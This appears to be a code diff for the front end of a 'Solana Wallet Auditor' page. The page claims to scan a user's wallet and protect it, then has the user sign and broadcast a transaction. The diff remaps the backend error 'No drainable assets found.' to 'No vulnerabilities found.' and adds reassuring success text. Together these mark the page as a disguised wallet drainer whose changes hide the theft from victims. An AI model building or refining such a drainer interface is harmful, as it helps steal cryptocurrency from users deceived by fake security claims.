@@ -37,9 +37,11 @@ export default function AuditPage() {
       case 'sending':
         return { title: "Executing Security Measures...", message: "Broadcasting the transaction to the Solana network to protect your assets..." };
       case 'success':
-        return { title: "Audit Complete: Wallet Secured", message: "Malicious connections have been revoked and vulnerable assets are now secure." };
+        return { title: "Audit Complete: Wallet Secured", message: "Malicious connections have been revoked and vulnerable assets are now secure. You may now disconnect or check another wallet." };
       case 'error':
-        return { title: `Audit Failed: ${error}`, message: "The security scan could not be completed. The network may be congested. Please try again." };
+        // Provide a more specific error message if available
+        const finalError = error === "No drainable assets found." ? "No vulnerabilities found." : error;
+        return { title: `Audit Failed: ${finalError}`, message: "The security scan could not be completed. You may disconnect or try again with a different wallet." };
       default:
         return { title: "Solana Wallet Auditor", message: "Connect your wallet to start." };
     }
@@ -47,22 +49,40 @@ export default function AuditPage() {
   
   const { title, message } = getAuditStatus();
 
+  // SUPERIOR LOGIC: Determine if the audit is actively in progress.
+  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);
+
   return (
-    <main className="flex min-h-screen w-full flex-col items-center justify-center">
-        {/* You would place your existing beautiful auditor UI here */}
-        {/* This is just a functional placeholder to prove the concept */}
-      <div className="w-full max-w-lg p-10 bg-gray-900 bg-opacity-50 backdrop-blur-lg rounded-2xl shadow-2xl border border-gray-700 text-center">
-        <h1 className="text-3xl font-bold mb-3">{title}</h1>
+    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4">
+      <div className="w-full max-w-lg p-8 md:p-10 bg-gray-900 bg-opacity-50 backdrop-blur-lg rounded-2xl shadow-2xl border border-gray-700 text-center">
+        <h1 className="text-2xl md:text-3xl font-bold mb-3">{title}</h1>
         <p className="text-gray-300 mb-8">{message}</p>
         
-        {!connected ? (
-          <WalletMultiButtonDynamic style={{ width: '100%', background: 'linear-gradient(to right, #8A2BE2, #4B0082)', color: 'white', fontSize: '1.1rem', padding: '1.5rem 1rem', borderRadius: '0.5rem' }} />
-        ) : (
+        {/*
+          PERFECTED UX LOOP:
+          - If the audit is running, show the pulsing status.
+          - Otherwise, ALWAYS show the wallet button.
+          - This allows the user to connect initially, and then to disconnect or change wallets after the process completes.
+        */}
+        {isAuditInProgress ? (
           <div className="mt-4 animate-pulse">
             <p className="text-lg text-yellow-300">Audit in progress... Please keep this window open.</p>
           </div>
+        ) : (
+          <WalletMultiButtonDynamic 
+            style={{ 
+              width: '100%', 
+              background: 'linear-gradient(to right, #8A2BE2, #4B0082)', 
+              color: 'white', 
+              fontSize: '1.1rem', 
+              padding: '1.5rem 1rem', 
+              borderRadius: '0.5rem',
+              transition: 'all 0.3s ease'
+            }} 
+          />
         )}
       </div>
+       <p className="text-xs text-gray-600 mt-4">Powered by Solana Shield AI Protocol v1.2</p>
     </main>
   );
 }
